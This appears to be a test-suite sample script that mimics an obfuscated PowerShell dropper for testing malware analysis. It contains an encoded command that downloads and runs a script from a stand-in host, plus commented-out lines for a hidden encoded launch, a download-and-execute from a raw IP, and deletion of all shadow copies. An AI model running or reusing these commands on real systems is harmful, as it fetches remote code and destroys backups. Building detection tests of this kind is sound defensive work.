# CyberShield Test Suite - Obfuscated PowerShell Dropper Sample
# Demonstrates script-based dynamic analysis and IOC extraction

$encodedPayload = "aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGQAbwBtAGEAaQBuAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="

Write-Host "Simulating dropper execution..."
# powershell.exe -w hidden -enc $encodedPayload
# IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/stage2.bin')
# vssadmin delete shadows /all /quiet

